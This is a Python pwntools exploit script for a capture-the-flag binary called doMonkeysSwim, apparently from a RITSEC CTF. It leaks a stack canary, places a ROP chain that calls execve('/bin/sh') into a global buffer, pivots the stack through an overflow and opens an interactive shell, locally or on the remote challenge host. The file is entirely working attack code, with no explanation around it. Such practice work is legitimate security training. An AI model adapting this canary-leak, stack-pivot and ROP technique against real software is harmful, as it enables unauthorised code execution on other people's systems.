#!/usr/bin/env python3
from pathlib import Path
from pwn import *

binary_path = Path(__file__).resolve().with_name("doMonkeysSwim")
context.binary = ELF(str(binary_path))
context.log_level = "info"

HOST = "dms.ctf.ritsec.club"
PORT = 1400

elf = context.binary

POP_RDI = 0x401f43
POP_RSI = 0x401f45
POP_RDX = 0x401f47
POP_RAX = 0x401f49
SYSCALL = 0x401349

BED = elf.symbols["bed"]


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)


def leak_canary(p):
    p.sendline(b"3")
    p.sendline(b"3")
    p.recvuntil(b"0x")
    leak = p.recvline().strip()
    return int(leak, 16)


def write_bed(p, canary):
    binsh_addr = BED + 0x58
    bed_payload = b"".join(
        [
            p64(canary),      # game canary check uses [rbp-0x8] after pivot
            p64(0x0),         # fake rbp
            p64(POP_RDI),
            p64(binsh_addr),
            p64(POP_RSI),
            p64(0),
            p64(POP_RDX),
            p64(0),
            p64(POP_RAX),
            p64(59),
            p64(SYSCALL),
            b"/bin/sh\x00",
        ]
    )

    if b"\n" in bed_payload:
        raise ValueError("newline in bed payload")

    p.sendline(b"5")
    p.recvuntil(b"Swap this: ")
    p.send(bed_payload + b"\n")
    p.recvuntil(b"With this: ")
    p.sendline(b"AAAA")


def overflow_monkey_do(p, canary):
    p.sendline(b"4")
    pad = b"A" * 0x18
    new_rbp = BED + 8
    payload = pad + p64(canary) + p64(new_rbp)[:7]
    if len(payload) != 39 or b"\n" in payload:
        raise ValueError("bad overflow payload")
    p.send(payload + b"\n")


def exploit():
    while True:
        p = start()
        try:
            p.recvuntil(b">>")
            canary = leak_canary(p)
            if b"\n" in p64(canary):
                p.close()
                continue

            p.recvuntil(b">>")
            write_bed(p, canary)

            p.recvuntil(b">>")
            overflow_monkey_do(p, canary)

            p.recvuntil(b">>")
            p.sendline(b"6")
            return p
        except Exception:
            p.close()


if __name__ == "__main__":
    io = exploit()
    io.interactive()
